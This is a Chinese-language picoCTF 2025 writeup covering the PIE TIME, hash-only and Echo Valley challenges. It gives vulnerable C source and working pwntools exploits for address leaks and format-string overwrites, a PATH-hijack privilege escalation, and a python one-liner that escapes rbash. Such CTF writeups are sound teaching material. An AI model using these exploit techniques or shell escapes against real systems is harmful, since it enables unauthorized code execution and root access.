---
title: "picoCTF 2025 Writeup"
description: "picoCTF 2025 Writeup"
publishDate: "19 Mar 2025"
updatedDate: "25 Aug 2025"
tags: ["CTF", "writeup", "picoCTF"]
---

# 前情提要

我們 (Grissia Jackoha hongyo young922) 在比賽最後三天才加入  
~~中途我還跑去看 OSCP 摸魚~~  
所以我們這次被電爆了，不過我自己是蠻滿意我們成績的  

- team: NotTooRomantic
- rank: 216 / 10460
- score: 5710 / 8510

這邊附上解題統計

![score](/images/picoCTF2025/score.png)

# Binary Exploitation

## PIE TIME

正如其名，就是考 PIE，沒什麼特別難的  

> source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
這種題目就沒什麼好說的，我速速帶過就好
```bash
$ objdump -d -M intel vuln

...
00000000000012a7 <win>:
    12a7:       f3 0f 1e fa             endbr64
    12ab:       55                      push   rbp
    12ac:       48 89 e5                mov    rbp,rsp
    12af:       48 83 ec 10             sub    rsp,0x10
...
000000000000133d <main>:
    133d:       f3 0f 1e fa             endbr64
    1341:       55                      push   rbp
    1342:       48 89 e5                mov    rbp,rsp
    1345:       48 83 ec 20             sub    rsp,0x20
...
```
> exploit
```python
from pwn import *

r = process("./vuln")

main = int(r.recvline().split()[-1], 16)
win = main - 0x133d + 0x12a7

r.sendlineafter(b"0x12345: ", str(hex(win)))

r.interactive()
```

## PIE TIME 2

> source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

這題就只是多了要用 fmt leak address，除此之外都差不多  
用 gdb 可以看 stack 就知道可以直接 leak ret address

```
pwndbg> stack
00:0000│ rsp 0x7fffffffd930 —▸ 0x7fffffffd950 ◂— 0xa2e70252e70 /* 'p.%p.\n' */
01:0008│-058 0x7fffffffd938 —▸ 0x7ffff7e2b415 (_IO_file_setbuf+21) ◂— test rax, rax
02:0010│ rdi 0x7fffffffd940 ◂— '%p.%p.%p.%p.%p.%p.%p.\n'
03:0018│-048 0x7fffffffd948 ◂— '.%p.%p.%p.%p.\n'
04:0020│-040 0x7fffffffd950 ◂— 0xa2e70252e70 /* 'p.%p.\n' */
05:0028│-038 0x7fffffffd958 —▸ 0x7ffff7e2167f (setvbuf+303) ◂— cmp rax, 1
06:0030│-030 0x7fffffffd960 ◂— 0
07:0038│-028 0x7fffffffd968 —▸ 0x7fffffffdac8 —▸ 0x7fffffffdd69 ◂— '/home/grissia/Documents/picoCTF/pwn/PIE_TIME_2/vuln'
08:0040│-020 0x7fffffffd970 ◂— 1
09:0048│-018 0x7fffffffd978 ◂— 0
0a:0050│-010 0x7fffffffd980 ◂— 0
0b:0058│-008 0x7fffffffd988 ◂— 0x688a528075c02200
0c:0060│ rbp 0x7fffffffd990 —▸ 0x7fffffffd9a0 —▸ 0x7fffffffda40 —▸ 0x7fffffffdaa0 ◂— 0
0d:0068│+008 0x7fffffffd998 —▸ 0x555555555441 (main+65) ◂— mov eax, 0
0e:0070│+010 0x7fffffffd9a0 —▸ 0x7fffffffda40 —▸ 0x7fffffffdaa0 ◂— 0
0f:0078│+018 0x7fffffffd9a8 —▸ 0x7ffff7dc31ca (__libc_start_call_main+122) ◂— mov edi, eax
```
> exploit
```python
from pwn import *

r = remote("rescued-float.picoctf.net", 54136)

r.sendlineafter(b"name:", b"%19$p")
leak = int(r.recvline().split()[-1], 16)
win = leak - 215
info(f"win:{hex(win)}")
r.sendlineafter(b"0x12345: ", str(hex(win)).encode())

r.interactive()
```

## hash-only-1

這題就比較有意思了，他會給一個 ssh 連線  
練進去後執行檔案就會吐出 */root/flag.txt* 的 *md5sum*  
![execution](/images/picoCTF2025/hash-only-1-1.png)  
那具體解法就是竄改 PATH 來執行其他東西，例如自己寫的 bash script  
![execution](/images/picoCTF2025/hash-only-1-2.png)  

## hash-only-2

這題基本上跟前一題一樣，不過用了 *rbash*
我參考了 [這篇文章](https://blog.csdn.net/qq_25924971/article/details/128884687)  
會發現這台機器可以執行`python -c 'import os; os.system("/bin/sh")'`  
操作結束後就跟前一題一模一樣

## Echo Valley

這是我第一次接觸 fmt 寫入的題目  
真的挺好玩的  
> source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }

    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```

> exploit:
```python
from pwn import *

r = remote("shape-facility.picoctf.net", 54781)

r.sendlineafter(b"Shouting: \n", b'%21$p')
win = int(r.recvline().split()[-1], 16) - 0x1AA
info(f"win: {hex(win)}")

r.sendline(b'%9$p')
ret = int(r.recvline().split()[-1], 16) + 0x30
info(f"ret: {hex(ret)}")

offset = 6
address = ret
target = win

# 我這邊分三次寫入，一次寫兩個 bytes
upper_target = (target >> 32) & 0xFFFF
midst_target = (target >> 16) & 0xFFFF
lower_target = (target) & 0xFFFF
info(f"upper_target: {hex(upper_target)}")
info(f"midst_target: {hex(midst_target)}")
info(f"lower_target: {hex(lower_target)}")

upper_address = p64(address)
midst_address = p64(address + 2)
lower_address = p64(address + 4)
info(f"upper_address: {(upper_address)}")
info(f"midst_address: {(midst_address)}")
info(f"lower_address: {(lower_address)}")


payload = f"%{lower_target}d".encode()
payload += f"%{offset + 2}$hn".encode()
payload += (8 - len(payload) % 8) * b'_'
payload += upper_address
r.sendline(payload)

payload = f"%{midst_target}d".encode()
payload += f"%{offset + 2}$hn".encode()
payload += (8 - len(payload) % 8) * b'_'
payload += midst_address
r.sendline(payload)

payload = f"%{upper_target}d".encode()
payload += f"%{offset + 2}$hn".encode()
payload += (8 - len(payload) % 8) * b'_'
payload += lower_address
r.sendline(payload)

r.sendline(b"exit")

r.interactive()
```